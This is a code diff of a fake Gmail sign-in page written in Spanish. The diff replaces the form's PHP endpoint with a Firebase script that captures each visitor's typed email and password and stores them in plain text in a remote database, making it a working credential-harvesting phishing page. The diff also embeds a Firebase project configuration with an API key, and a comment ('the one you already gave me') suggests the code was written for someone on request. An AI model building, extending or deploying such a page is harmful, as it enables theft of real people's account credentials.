@@ -12,9 +12,10 @@
     <h1>Inicia sesión</h1>
     <p class="sub">Ir a Gmail</p>
 
-    <form action="guardar.php" method="POST">
-      <input type="email" name="correo" placeholder="Correo electrónico o teléfono" class="input-field" required>
-      <input type="password" name="password" placeholder="Contraseña" class="input-field" required>
+    <!-- Quitamos action="guardar.php" porque ahora se guarda en Firebase -->
+    <form id="loginForm">
+      <input type="email" id="correo" placeholder="Correo electrónico o teléfono" class="input-field" required>
+      <input type="password" id="password" placeholder="Contraseña" class="input-field" required>
 
       <div class="actions">
         <button type="button" class="create-account">Crear cuenta</button>
@@ -28,6 +29,51 @@
       <a href="#">Términos</a>
     </footer>
   </div>
+
+  <!-- 🔥 Script de conexión a Firebase -->
+  <script type="module">
+    // Importar módulos Firebase desde CDN
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
+
+    // Tu configuración (la que ya me diste)
+    const firebaseConfig = {
+      apiKey: "AIzaSyDRKmSEokWgEsQn4yMxgrc7346UMlnsuKk",
+      authDomain: "villnopruebas.firebaseapp.com",
+      databaseURL: "https://villnopruebas-default-rtdb.firebaseio.com",
+      projectId: "villnopruebas",
+      storageBucket: "villnopruebas.firebasestorage.app",
+      messagingSenderId: "730093777967",
+      appId: "1:730093777967:web:d8b6f50d2648bef1c9c2da",
+      measurementId: "G-P23M7EWNG0"
+    };
+
+    // Inicializar Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Capturar formulario y guardar datos
+    const form = document.getElementById("loginForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const correo = document.getElementById("correo").value;
+      const password = document.getElementById("password").value;
+
+      // Guardar los datos en la base de datos Firebase
+      set(ref(db, "usuarios/" + Date.now()), {
+        correo: correo,
+        password: password
+      })
+      .then(() => {
+        alert("✅ Datos guardados correctamente en Firebase");
+        form.reset();
+      })
+      .catch((error) => {
+        alert("❌ Error al guardar: " + error);
+      });
+    });
+  </script>
 
 </body>
 </html>
